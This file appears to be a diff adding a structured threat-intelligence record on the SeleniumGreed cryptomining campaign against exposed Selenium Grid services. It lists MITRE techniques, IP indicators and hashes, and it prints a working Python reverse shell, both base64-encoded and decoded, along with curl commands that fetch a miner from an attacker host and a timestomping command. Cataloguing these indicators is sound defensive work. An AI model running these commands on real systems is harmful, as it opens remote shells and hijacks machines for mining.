@@ -1,0 +1,240 @@
+{
+  "malware_family": "SeleniumGreed",
+  "threat_actor": "",
+  "platforms": [
+    "linux"
+  ],
+  "summary": "SeleniumGreed is a cryptomining campaign that exploits publicly exposed and misconfigured Selenium Grid services. Attackers execute a Python reverse shell to download and run a modified XMRig miner, which is packed with a custom UPX header. The threat actor uses various anti-forensic techniques like timestomping, disabling shell history, and using compromised infrastructure for C2 and as a mining pool proxy.",
+  "mitre_techniques": [
+    "T1105",
+    "T1222.002",
+    "T1564.001",
+    "T1564.011",
+    "T1562.003",
+    "T1070.006",
+    "T1027.002",
+    "T1059.004",
+    "T1496",
+    "T1584.004"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "/usr/bin/python3 -c b=b'aW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgnMTY0LjkwLjE0OS4xMDQnLDkwMjEpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtvcy5wdXRlbnYoJ0hJU1RGSUxFJywnL2Rldi9udWxsJyk7b3MucHV0ZW52KCdUVFQnLCcxOTIuMjQxLjE0NC42OTo0NDQ3Jyk7cHR5LnNwYXduKCcvYmluL2Jhc2gnKTtzLmNsb3NlKCk=';import base64;exec(base64.b64decode(b).decode()) --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.ry2G5o data:,",
+      "context": "Initial RCE payload executed via Selenium WebDriver API.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "import os,pty,socket;s=socket.socket();s.connect(('164.90.149.104',9021));[os.dup2(s.fileno(),f)for f in(0,1,2)];os.putenv('HISTFILE','/dev/null');os.putenv('TTT','192.241.144.69:4447');pty.spawn('/bin/bash');s.close()",
+      "context": "Decoded Python one-liner for reverse shell and env setup.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -s http://164.90.149.104:9022/xm2 -o /bin/xm",
+      "context": "Command to download the XMRig miner.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -s http://164.90.149.104:9022/wxm -o /bin/wxm",
+      "context": "Command to download the miner runner script.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "touch -d Fri, 12 Jul 2019 15:26:41 -0400 /bin/xm /bin/wxm",
+      "context": "Timestomping command for downloaded miner and script.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "grep seluser ALL=(ALL) PASSWD: ALL",
+      "context": "Command to check if seluser password for sudo is enforced.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 43 41 54 53 }",
+      "context": "Custom UPX header 'CATS' found in the miner binary.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/bin/xm",
+      "context": "Path for the downloaded XMRig miner binary.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/bin/wxm",
+      "context": "Path for the downloaded miner runner script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/dev/shm/.18a91ec2",
+      "context": "Example path of a hidden script created by the attacker.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "/usr/bin/python3 -> /bin/bash",
+      "context": "Initial exploit process tree showing python spawning a bash shell.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "TTT",
+      "context": "Environment variable name set by the reverse shell payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "seluser",
+      "context": "Default Selenium user account abused for passwordless sudo execution.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "164.90.149.104",
+      "context": "C2 for reverse shell and payload hosting.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "192.241.144.69",
+      "context": "C2 IP set in 'TTT' environment variable.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://164.90.149.104:9022/xm2",
+      "context": "URL for downloading the miner binary.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://164.90.149.104:9022/wxm",
+      "context": "URL for downloading the miner runner script.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "165.227.63.241",
+      "context": "Mining pool proxy IP.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "165.22.195.35",
+      "context": "Mining pool proxy IP.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "sha1: 249d0f41d58fe90cf17bedc8d0c39c6c88e33251",
+      "context": "Mining pool TLS fingerprint.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "sha256: d5aaa3b923dd8ede43e4cd9eea642d24f3d9be03273d5f97902bc615849af208",
+      "context": "Mining pool TLS fingerprint.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "4444",
+      "context": "Default Selenium Grid hub port targeted by attackers.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "6852b1102b0efc7ceb47520080fca57eb1a647c4e1c7ff3a40da9757c92ebaab",
+      "description": "XMRig miner with custom UPX header"
+    },
+    {
+      "sha256": "fd5f076e99fd2ccb5f8aef5b4f69a8c2bf231808b2480f9d31955154a1509552",
+      "description": "XMRig miner with custom UPX header"
+    }
+  ],
+  "file_types": [
+    "elf",
+    "script"
+  ]
+}
